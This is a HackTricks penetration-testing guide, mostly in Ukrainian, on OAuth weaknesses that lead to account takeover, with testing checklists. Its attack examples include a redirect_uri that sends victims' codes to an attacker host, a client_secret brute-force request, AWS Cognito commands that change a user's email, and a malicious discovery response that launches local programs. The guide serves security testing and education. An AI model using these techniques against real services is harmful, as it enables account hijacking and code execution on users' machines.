# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Основна інформація <a href="#d4a8" id="d4a8"></a>

OAuth пропонує різні версії, базові відомості доступні за адресою [OAuth 2.0 documentation](https://oauth.net/2/). Ця дискусія зосереджена переважно на широко використовуваному [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), який надає **фреймворк авторизації, що дозволяє застосунку отримувати доступ або виконувати дії в обліковому записі користувача в іншому застосунку** (authorization server).

Розглянемо гіпотетичний вебсайт _**https://example.com**_, призначений для **відображення всіх ваших постів у соціальних мережах**, включно з приватними. Для цього використовується OAuth 2.0. _https://example.com_ попросить ваш дозвіл на **доступ до ваших постів у соціальній мережі**. Внаслідок цього на _https://socialmedia.com_ з’явиться екран згоди, де будуть зазначені **запитувані дозволи та розробник, який робить запит**. Після вашої авторизації _https://example.com_ отримає змогу **отримувати доступ до ваших постів від вашого імені**.

Варто зрозуміти наступні компоненти в рамках OAuth 2.0:

- **власник ресурсу**: Ви, як **користувач/суб’єкт**, який надає доступ до свого ресурсу, наприклад постів у соціальній мережі.
- **сервер ресурсів**: **сервер, що обробляє автентифіковані запити** після того, як застосунок отримав `access token` від імені власника ресурсу, наприклад **https://socialmedia.com**.
- **клієнтський додаток**: **застосунок, що запитує авторизацію** у власника ресурсу, наприклад **https://example.com**.
- **сервер авторизації**: **сервер, який видає `access tokens`** клієнтському додатку після успішної автентифікації власника ресурсу та отримання дозволу, наприклад **https://socialmedia.com**.
- **client_id**: Публічний, унікальний ідентифікатор для застосунку.
- **client_secret:** Конфіденційний ключ, відомий лише застосунку та серверу авторизації, що використовується для генерації `access_tokens`.
- **response_type**: Значення, яке вказує **тип запитуваного токена**, наприклад `code`.
- **scope**: **Рівень доступу**, який клієнтський додаток запитує у власника ресурсу.
- **redirect_uri**: **URL, на який користувач буде перенаправлений після авторизації**. Зазвичай повинен збігатися з попередньо зареєстрованою URL-адресою переадресації.
- **state**: Параметр для **збереження даних під час перенаправлення користувача на сервер авторизації і назад**. Його унікальність критична для виконання ролі **механізму захисту від CSRF**.
- **grant_type**: Параметр, що вказує **тип гранту та тип токена, який повернеться**.
- **code**: Код авторизації від сервера авторизації, який використовується разом із `client_id` та `client_secret` клієнтським додатком для отримання `access_token`.
- **access_token**: **Токен, який клієнтський додаток використовує для API-запитів** від імені власника ресурсу.
- **refresh_token**: Дозволяє застосунку **отримати новий `access_token` без повторного запиту до користувача**.

### Потік

**Фактичний OAuth-потік** відбувається наступним чином:

1. Ви переходите на [https://example.com](https://example.com) і натискаєте кнопку «Integrate with Social Media».
2. Сайт надсилає запит до [https://socialmedia.com](https://socialmedia.com), просячи ваш дозвіл дозволити застосунку https://example.com отримувати доступ до ваших постів. Запит має таку структуру:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Вам потім показують сторінку згоди.
4. Після вашого схвалення Social Media надсилає відповідь на `redirect_uri` з параметрами `code` та `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com використовує цей `code`, разом зі своїм `client_id` та `client_secret`, щоб зробити серверний запит для отримання `access_token` від вашого імені, що надає доступ до дозволів, на які ви погодилися:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Нарешті, процес завершується, коли https://example.com використовує ваш `access_token` для виконання API-запиту до Social Media для доступу

## Вразливості <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Відповідно до [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), сервер авторизації має перенаправляти браузер лише на **pre-registered, exact redirect URIs**. Будь-яка слабкість тут дозволяє атакуючому направити жертву через зловмисний authorization URL так, що IdP доставляє `code` (і `state`) жертви безпосередньо на endpoint атакуючого, який потім може його викупити й зібрати токени.

Типовий сценарій атаки:

1. Скласти `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` і надіслати його жертві.
2. Жертва аутентифікується та погоджується на scopes.
3. IdP перенаправляє на `attacker.tld/callback?code=<victim-code>&state=...`, де атакуючий логгує запит і одразу обмінює код.

Типові помилки валідації, які слід перевірити:

- **No validation** – приймається будь-яка абсолютна URL-адреса, що призводить до миттєвого викрадення коду.
- **Weak substring/regex checks on the host** – обхід за допомогою схожих доменів, таких як `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, або `match.com@evil.com`.
- **IDN homograph mismatches** – валідація відбувається у формі punycode (`xn--`), але браузер редіректить на Unicode-домен, контрольований атакуючим.
- **Arbitrary paths on an allowed host** – вказання `redirect_uri` на `/openredirect?next=https://attacker.tld` або будь-який XSS/user-content endpoint призводить до витоку коду через ланцюжок редіректів, Referer headers або інжектований JavaScript.
- **Directory constraints without normalization** – патерни на кшталт `/oauth/*` можна обійти за допомогою `/oauth/../anything`.
- **Wildcard subdomains** – прийняття `*.example.com` означає, що будь-яке takeover (dangling DNS, S3 bucket тощо) негайно надає дійсний callback.
- **Non-HTTPS callbacks** – пропуск `http://` URI дає мережевим атакуючим (Wi-Fi, корпоративний проксі) можливість перехопити код у транзиті.

Також перевірте допоміжні параметри типу redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri` тощо) та OpenID discovery document (`/.well-known/openid-configuration`) на наявність додаткових endpoint’ів, які можуть успадкувати ті самі помилки валідації.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Як зазначено в цьому bug bounty звіті [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), можливо, що redirect **URL is being reflected in the response** сервера після аутентифікації користувача й є **уразливим до XSS**. Можливий payload для тестування:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Неправильна обробка параметра `state` <a href="#bda5" id="bda5"></a>

Параметр `state` — це Authorization Code flow CSRF-токен: клієнт повинен згенерувати **криптографічно випадкове значення для кожного екземпляру браузера**, зберегти його в місці, доступному лише цьому браузеру (cookie, local storage тощо), відправити його в запиті авторизації і відхиляти будь-яку відповідь, яка не повертає те саме значення. Якщо значення статичне, передбачуване, необов’язкове або не прив’язане до сесії користувача, атакуючий може завершити власний OAuth-потік, перехопити кінцевий запит `?code=` (не відправляючи його), а потім змусити браузер жертви повторно виконати цей запит, щоб обліковий запис жертви став пов’язаний з профілем атакуючого у провайдера ідентифікації.

Схема відтворення завжди однакова:

1. Атакуючий аутентифікується в IdP зі своїм обліковим записом і перехоплює останній редирект, що містить `code` (і будь-який `state`).
2. Він відкидає той запит, зберігає URL і пізніше зловживає будь-яким CSRF-примітивом (посилання, iframe, форма з авто-відправкою), щоб змусити браузер жертви його завантажити.
3. Якщо клієнт не контролює `state`, застосунок споживає результат авторизації атакуючого і виконує вхід атакуючого в обліковий запис жертви.

Практичний чекліст для обробки `state` під час тестування:

- **Відсутній `state` повністю** – якщо параметр ніколи не з’являється, весь логін вразливий до CSRF.
- **`state` не обов’язковий** – видаліть його з початкового запиту; якщо IdP все ще видає коди, які клієнт приймає, захист реалізовано опціонально.
- **Повернутий `state` не перевіряється** – змініть значення у відповіді (Burp, MITM proxy). Прийняття невідповідних значень означає, що збережений токен ніколи не порівнюється.
- **Передбачуваний або чисто залежний від даних `state`** – багато додатків вкладають у `state` шляхи редиректу або JSON-блоки без додавання випадковості, що дозволяє зловмисникам вгадувати дійсні значення й відтворювати потоки. Завжди додавайте сильну ентропію перед кодуванням або після даних.
- **Фіксація `state`** – якщо додаток дозволяє користувачам задавати значення `state` (наприклад, через спеціально сформовані URLs авторизації) і повторно використовує його у потоці, атакуючий може зафіксувати відоме значення і повторно застосувати його для кількох жертв.

PKCE може доповнювати `state` (особливо для публічних клієнтів), прив’язуючи authorization code до code verifier, але веб-клієнти все одно мають відстежувати `state`, щоб запобігти CSRF між користувачами та багам зв’язування облікових записів.

### До захоплення облікового запису <a href="#ebe4" id="ebe4"></a>

1. **Відсутня перевірка електронної пошти при створенні облікового запису**: атакуючі можуть попередньо створити обліковий запис, використовуючи електронну пошту жертви. Якщо згодом жертва увійде через сторонній сервіс, застосунок може випадково прив’язати цей сторонній акаунт до попередньо створеного облікового запису атакуючого, що призведе до несанкціонованого доступу.
2. **Зловживання слабкою верифікацією email в OAuth**: атакуючі можуть скористатися OAuth-сервісами, які не верифікують електронну пошту, зареєструвавшись і потім змінивши email облікового запису на email жертви. Цей метод також створює ризик несанкціонованого доступу, подібно до першого сценарію, але через інший вектор атаки.

### Розкриття секретів <a href="#e177" id="e177"></a>

`client_id` навмисно публічний, але **`client_secret` ніколи не має бути відновлюваним кінцевими користувачами**. Деплойменти Authorization Code, які вбудовують секрет у **mobile APKs, desktop clients, or single-page apps**, фактично передають ці облікові дані будь-кому, хто може завантажити пакет. Завжди перевіряйте public clients шляхом:

- Розпаковування APK/IPA, інсталятора для desktop або Electron-додатку та пошуку (`grep`) за `client_secret`, Base64-блоків, що декодуються в JSON, або жорстко зашитих OAuth-ендпоінтів.
- Перегляду включених конфігураційних файлів (plist, JSON, XML) або декомпільованих рядків на предмет клієнтських облікових даних.

Після того як атакуючий витягне секрет, йому достатньо вкрасти будь-який авторизаційний `code` жертви (через слабкий `redirect_uri`, логи тощо), щоб самостійно звернутися до `/token` та отримати access/refresh токени без участі легітимного застосунку. Слід вважати, що public/native clients **не здатні зберігати секрети** — їм слід покладатися на PKCE (RFC 7636) для підтвердження володіння per-instance code verifier замість статичного секрету. Під час тестування перевірте, чи PKCE обов’язковий і чи бекенд фактично відхиляє обміни токенів, які не містять або `client_secret`, **або** дійсний `code_verifier`.

### Брутфорс `client_secret`

Ви можете спробувати **перебрати `client_secret` методом брутфорсу** постачальника сервісу у співпраці з identity provider, щоб намагатися викрасти облікові записи.\
Запит для брутфорсу може виглядати приблизно так:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Якщо клієнт отримав **code and state**, і вони **відображаються в Referer header** коли він переходить на іншу сторінку — це уразливість.

### Access Token Stored in Browser History

Основна гарантія Authorization Code grant полягає в тому, що **access tokens ніколи не потрапляють у браузер власника ресурсу**. Коли імплементації leak tokens на стороні клієнта, будь-який незначний баг (XSS, Referer leak, proxy logging) призводить до миттєвої компрометації облікового запису. Завжди перевіряйте:

- **Tokens in URLs** – якщо `access_token` з'являється в query/fragment, він потрапляє в історію браузера, server logs, analytics і Referer headers, що надсилаються стороннім сервісам.
- **Tokens transiting untrusted middleboxes** – повернення token'ів по HTTP або через debugging/corporate proxies дозволяє мережевим спостерігачам захопити їх напряму.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, або сериалізовані JSON blobs відкривають токени для кожного скрипта на origin (включаючи XSS payloads або шкідливі розширення).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` зберігають токени довго після logout на спільних пристроях і доступні для скриптів.

Будь-яке з цих виявлень зазвичай підвищує серйозність і перетворює інакше «низькі» баги (наприклад CSP bypass або DOM XSS) у повний API takeover, оскільки зловмисник може просто прочитати та відтворити leaked bearer token.

### Everlasting Authorization Code

Authorization codes повинні бути **короткоживі, одноразові та захищені від повторного використання**. Під час оцінки flow, захопіть `code` і:

- **Test the lifetime** – RFC 6749 рекомендує хвилини, не години. Спробуйте викупити `code` через 5–10 хвилин; якщо він усе ще працює, вікно експозиції для будь-якого leaked code занадто велике.
- **Test sequential reuse** – надішліть той самий `code` двічі. Якщо другий запит повертає інший token, зловмисники можуть клонувати сесії нескінченно.
- **Test concurrent redemption/race conditions** – відправте два token-запити паралельно (Burp intruder, turbo intruder). Слабкі issuers іноді видають обидва.
- **Observe replay handling** – спроба повторного використання має не лише зазнати невдачі, але й відкликати будь-які токени, вже згенеровані з цього code. Інакше виявлений replay лишає перший токен зловмисника активним.

Комбінування replay-friendly code з будь-яким `redirect_uri` або багом логування дозволяє зберегти постійний доступ до облікового запису навіть після того, як жертва завершує легітимний вхід.

### Authorization/Refresh Token not bound to client

Якщо ви можете отримати **authorization code і використати його з іншим клієнтом, то ви можете takeover інших облікових записів**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) видно, що **token**, який **AWS Cognito** повертає користувачу, може мати **достатні права для перезапису даних користувача**. Отже, якщо ви можете **змінити user email на іншу user email**, ви можете **take over** облікові записи інших.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Зловживання токенами інших додатків <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.

This is because an **attacker** could create an **application supporting OAuth and login with Facebook** (for example) in his own application. Then, once a victim logins with Facebook in the **attackers application**, the attacker could get the **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Therefore, if the attacker manages to get the user access his own OAuth application, he will be able to take over the victims account in applications that are expecting a token and aren't checking if the token was granted to their app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), it was possible to make a victim open a page with a **returnUrl** pointing to the attackers host. This info would be **stored in a cookie (RU)** and in a **later step** the **prompt** will **ask** the **user** if he wants to give access to that attackers host.

To bypass this prompt, it was possible to open a tab to initiate the **Oauth flow** that would set this RU cookie using the **returnUrl**, close the tab before the prompt is shown, and open a new tab without that value. Then, the **prompt won't inform about the attackers host**, but the cookie would be set to it, so the **token will be sent to the attackers host** in the redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations allows to indicate the **`prompt`** GET parameter as None (**`&prompt=none`**) to **prevent users being asked to confirm** the given access in a prompt in the web if they are already logged in the platform.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), it might be possible to indicate the parameter **`response_mode`** to indicate where do you want the code to be provided in the final URL:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs are ideal clickjacking targets: if they can be framed, an attacker can overlay custom graphics, hide the real buttons, and trick users into approving dangerous scopes or linking accounts. Build PoCs that:

1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Use absolute positioning/opacity tricks to align fake buttons with the hidden **Allow**/**Approve** controls.
3. Optionally pre-fill parameters (scopes, redirect URI) so the stolen approval immediately benefits the attacker.

During testing verify that IdP pages emit either `X-Frame-Options: DENY/SAMEORIGIN` or a restrictive `Content-Security-Policy: frame-ancestors 'none'`. If neither is present, demonstrate the risk with tooling like [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) and record how easily a victim authorizes the attacker’s app. For additional payload ideas see [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), this is an OAuth flow that allows to login in OAuth via **username** and **password**. If during this simple flow a **token** with access to all the actions the user can perform is returned then it's possible to bypass 2FA using that token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO. The attack was:

1. Victim access the attackers web page
2. The victim opens the malicious link and an opener starts the Google OAuth flow with `response_type=id_token,code&prompt=none` as additional parameters using as **referrer the attackers website**.
3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri` parameter (victim web) with 30X code which still keeps the attackers website in the referer.
4. The victim **website trigger the open redirect based on the referrer** redirecting the victim user to the attackers website, as the **`respose_type`** was **`id_token,code`**, the code will be sent back to the attacker in the **fragment** of the URL allowing him to tacke over the account of the user via Google in the victims site.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth serves as a less obvious but critical vector for security vulnerabilities, specifically for **Server-Side Request Forgery (SSRF)** attacks. This endpoint allows OAuth servers to receive details about client applications, including sensitive URLs that could be exploited.

**Key Points:**

- **Dynamic Client Registration** is often mapped to `/register` and accepts details like `client_name`, `client_secret`, `redirect_uris`, and URLs for logos or JSON Web Key Sets (JWKs) via POST requests.
- This feature adheres to specifications laid out in **RFC7591** and **OpenID Connect Registration 1.0**, which include parameters potentially vulnerable to SSRF.
- The registration process can inadvertently expose servers to SSRF in several ways:
- **`logo_uri`**: A URL for the client application's logo that might be fetched by the server, triggering SSRF or leading to XSS if the URL is mishandled.
- **`jwks_uri`**: A URL to the client's JWK document, which if maliciously crafted, can cause the server to make outbound requests to an attacker-controlled server.
- **`sector_identifier_uri`**: References a JSON array of `redirect_uris`, which the server might fetch, creating an SSRF opportunity.
- **`request_uris`**: Lists allowed request URIs for the client, which can be exploited if the server fetches these URIs at the start of the authorization process.

**Exploitation Strategy:**

- SSRF can be triggered by registering a new client with malicious URLs in parameters like `logo_uri`, `jwks_uri`, or `sector_identifier_uri`.
- While direct exploitation via `request_uris` may be mitigated by whitelist controls, supplying a pre-registered, attacker-controlled `request_uri` can facilitate SSRF during the authorization phase.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.

**Attack workflow**

1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.
2. The server answers with JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Клієнт запускає OS handler для переданого URI. Windows приймає payloads на кшталт `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux приймають `file:///Applications/Calculator.app/...` або навіть кастомні схеми, такі як `cmd://bash -lc '<payload>'`, якщо вони зареєстровані.
4. Оскільки це відбувається до будь‑якої взаємодії з користувачем, **достатньо просто налаштувати клієнт на зв'язок з сервером атакуючого, щоб отримати виконання коду**.

**Як тестувати**

- Націльтесь на будь‑який OAuth‑сумісний desktop/agent, який виконує discovery через HTTP(S) і відкриває повернені endpoints локально (Electron apps, CLI helpers, thick clients).
- Перехопіть або розмістіть відповідь discovery і замініть `authorization_endpoint`, `device_authorization_endpoint` або схожі поля на `file://`, `cmd://`, UNC шляхи або інші небезпечні схеми.
- Спостерігайте, чи валідизує клієнт схему/хост. Відсутність валідaції призводить до миттєвого виконання в контексті користувача і підтверджує уразливість.
- Повторіть з різними схемами, щоб змалювати повну атаку поверхню (наприклад, `ms-excel:`, `data:text/html,`, custom protocol handlers) і продемонструвати крос‑платформенний вплив.

## OAuth providers Race Conditions

Якщо платформа, яку ви тестуєте, є OAuth provider — [**прочитайте це, щоб перевірити можливі Race Conditions**](race-condition.md).

## Mutable Claims Attack

У OAuth поле sub унікально ідентифікує користувача, але його формат залежить від Authorization Server. Щоб стандартизувати ідентифікацію користувача, деякі клієнти використовують email або user handles. Однак це ризиковано, тому що:

- Деякі Authorization Servers не гарантують, що ці властивості (наприклад, email) залишаються незмінними.
- В деяких реалізаціях — таких як **"Login with Microsoft"** — клієнт покладається на поле email, яке **керується користувачем в Entra ID** і не верифікується.
- Атакуючий може скористатися цим, створивши власну Azure AD організацію (наприклад, doyensectestorg) і використавши її для Microsoft login.
- Хоча Object ID (збережений у sub) є незмінним і безпечним, покладання на змінне поле email може дозволити takeover аккаунту (наприклад, перехоплення аккаунту на кшталт victim@gmail.com).

## Client Confusion Attack

У Client Confusion Attack додаток, що використовує OAuth Implicit Flow, не перевіряє, що фінальний access token був згенерований саме для його Client ID. Атакуючий створює публічний вебсайт, який використовує Google’s OAuth Implicit Flow, змушуючи тисячі користувачів залогінитись і збираючи access tokens, призначені для сайту атакуючого. Якщо ці користувачі також мають акаунти на іншому вразливому вебсайті, який не валідовує Client ID у токені, атакуючий може повторно використати зібрані токени, щоб апроксимувати жертв і захопити їх акаунти.

## Scope Upgrade Attack

Authorization Code Grant передбачає захищену server-to-server комунікацію для передачі даних користувача. Проте, якщо Authorization Server неявно довіряє параметру scope в Access Token Request (параметру, що не визначений у RFC), шкідливий додаток може підвищити привілеї authorization code, запитавши вищий scope. Після генерації Access Token, Resource Server має його верифікувати: для JWT‑токенів це включає перевірку підпису JWT та витяг даних, таких як client_id і scope, а для випадкових string‑токенів сервер повинен запитати у Authorization Server деталі токена.

## Redirect Scheme Hijacking

У мобільних OAuth реалізаціях додатки використовують custom URI schemes для отримання редиректів з Authorization Codes. Однак оскільки на пристрої кілька додатків можуть зареєструвати ту саму схему, припущення, що лише легітимний клієнт контролює redirect URI, порушується. На Android, наприклад, Intent URI на кшталт `com.example.app://` перехоплюється на основі схеми і опціональних фільтрів, визначених в intent-filter додатку. Оскільки resolution intents в Android може бути широким — особливо якщо вказана лише схема — атакуючий може зареєструвати шкідливий додаток з ретельно сформованим intent filter, щоб перехопити authorization code. Це може **дозволити takeover акаунту** як через взаємодію з користувачем (коли кілька додатків можуть обробити intent), так і через методи обходу, що експлуатують надмірно специфічні фільтри, як описано у flowchart від Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
